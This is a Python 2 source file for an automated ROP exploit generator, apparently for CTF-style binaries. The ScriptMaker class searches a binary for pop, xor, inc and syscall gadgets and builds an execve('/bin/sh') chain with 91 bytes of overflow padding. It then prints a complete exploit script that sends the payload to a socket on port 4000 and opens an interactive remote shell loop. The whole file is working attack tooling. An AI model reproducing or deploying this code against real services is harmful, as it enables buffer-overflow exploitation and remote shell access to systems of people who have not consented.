#!/usr/bin/env python
from RopChainer import *

class ScriptMaker(object):
    tab = " " * 4 # set tab

    def __init__(self, gadget):
        self.__Gadget = gadget
        self.__gadgets = self.__Gadget.getGadgets()
        self.chainer = RopChainer(self.__gadgets)
        self.prepare_script()
        self.prepare_gadgets()

    def prepare_script(self):
        self.Header  = "#!/usr/bin/env python" + "\n"
        self.Header += "from util import *" + "\n"
        self.Header += "import socket" + "\n"
        #self.Header += "import sys" + "\n"
        self.Header += "\n"
        self.Header += "bin = pStr(\"/bin\") "+ "\n"
        self.Header += "sh  = pStr(\"/sh\") "+ "\n"

        self.Header += "padding  = \"A\" * 91" + "\n"
        self.Header += "padding += p32(bin) + p32(sh)" + "\n"
        self.Header += "\n"
        self.Header += "\n"

    def prepare_gadgets(self):
        # get all single pop eax ebx ecx edx
        self.pop_eax = self.chainer.searchSingleGadgets("pop eax")
        self.pop_ebx = self.chainer.searchSingleGadgets("pop ebx")
        self.pop_ecx = self.chainer.searchSingleGadgets("pop ecx")
        self.pop_edx = self.chainer.searchSingleGadgets("pop edx")

        # get all single xor eax ebx ecx edx
        self.xor_eax = self.chainer.searchSingleGadgets("xor eax")
        self.xor_ebx = self.chainer.searchSingleGadgets("xor ebx")
        self.xor_ecx = self.chainer.searchSingleGadgets("xor ecx")
        self.xor_edx = self.chainer.searchSingleGadgets("xor edx")

        # get all single inc eax ebx ecx edx
        self.inc_eax = self.chainer.searchSingleGadgets("inc eax")
        self.inc_ebx = self.chainer.searchSingleGadgets("inc ebx")
        self.inc_ecx = self.chainer.searchSingleGadgets("inc ecx")
        self.inc_edx = self.chainer.searchSingleGadgets("inc edx")

        # get pop gadget length more then one
        self.multi_pop = self.chainer.searchMultiGadgets("pop")
        self.multi_xor = self.chainer.searchMultiGadgets("xor")
        self.multi_inc = self.chainer.searchMultiGadgets("inc")

        # get syscall gadgets
        self.syscall = self.chainer.searchSyscall()

    def multiPopChain(self, main_pop=0):
        pops = self.multi_pop[main_pop]
        #set register value
        rets = {
                "eax" : 0xb,
                "ebx" : 0xf6ffee64,
                "ecx" : 0x0,
                "edx" : 0x0
                }
        curReg = {
                "eax" : -1,
                "ebx" : -1,
                "ecx" : -1,
                "edx" : -1
                }
        sort = [{"vaddr": pops["vaddr"], "value": []}]
        codes = pops["gadgets"].split(" ; ")[:-1]
        for code in codes:
            code = code.split()[1]
            if curReg[code]!=rets[code]:
                curReg[code] = rets[code]
                sort[0]["value"].append(rets[code])

        single_pops = {"eax" : self.pop_eax[0]["vaddr"],
                       "ebx" : self.pop_ebx[0]["vaddr"],
                       "ecx" : self.pop_ecx[0]["vaddr"],
                       "edx" : self.pop_edx[0]["vaddr"]}
        for reg in curReg.keys():
            if curReg[reg]!=rets[reg]:
                sort.append({"vaddr": single_pops[reg], "value":[rets[reg]]})
        return sort

    def prepare_chain(self, **keys):
        self.chain = "chain  = \"\"" + "\n"
        chainer = self.multiPopChain(0)
        for gadget in chainer:
            self.chain += "chain += " + self.prepare_func("p32", gadget["vaddr"]) + "\n"
            for arg in gadget["value"]:
                self.chain += "chain += " + self.prepare_func("p32", arg) + "\n"
        sysgadget = self.syscall[0]
        self.chain += "chain += " + self.prepare_func("p32", sysgadget["vaddr"]) + "\n"

    def prepare_func(self, name, arg):
        return name + "(" + str(arg) +  ")"

    def make_script(self):
        self.exploit = self.Header
        self.exploit += self.chain
        self.exploit += "\n"
        self.exploit += "payload = padding + chain" + "\n"
        self.exploit += "r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)" + "\n"
        self.exploit += "r.connect((\"0.0.0.0\", 4000))" + "\n"
        self.exploit += "r.send(payload+\"\\n\")" + "\n"
        self.exploit += "r.settimeout(0.1)" + "\n"
        self.exploit += "shHead = \"$ \"" + "\n"
        self.exploit += "\n"
        self.exploit += "while True:" + "\n"
        self.exploit += self.tab + "try:" + "\n"
        self.exploit += self.tab*2 + "command = raw_input(shHead)" + "\n"
        self.exploit += self.tab*2 + "r.send(command+\"\\n\")" + "\n"
        self.exploit += self.tab*2 + "l = 1" + "\n"
        self.exploit += self.tab*2 + "response = \"\"" + "\n"
        self.exploit += self.tab*2 + "recvLen = 1" + "\n"
        self.exploit += self.tab*2 + "while recvLen:" + "\n"
        self.exploit += self.tab*3 + "data = r.recv(4096)" + "\n"
        self.exploit += self.tab*3 + "recvLen = len(data)" + "\n"
        self.exploit += self.tab*3 + "response += data" + "\n"
        self.exploit += self.tab*3 + "if recvLen < 4096:" + "\n"
        self.exploit += self.tab*4 + "break" + "\n"
        self.exploit += self.tab*2 + "if not response:" + "\n"
        self.exploit += self.tab*3 + "continue" + "\n"
        self.exploit += self.tab*2 + "print response" + "\n"
        self.exploit += self.tab*1 + "except EOFError:" + "\n"
        self.exploit += self.tab*2 + "print" + "\n"
        self.exploit += self.tab*2 + "print \"[+] Get EOF\"" + "\n"
        self.exploit += self.tab*2 + "break" + "\n"
        self.exploit += self.tab*1 + "except socket.timeout:" + "\n"
        self.exploit += self.tab*2 + "continue" + "\n"
        self.exploit += self.tab*1 + "except Exception as e:" + "\n"
        self.exploit += self.tab*2 + "print str(e)" + "\n"
        self.exploit += self.tab*2 + "r.close()" + "\n"
        self.exploit += self.tab*2 + "break"
        print self.exploit
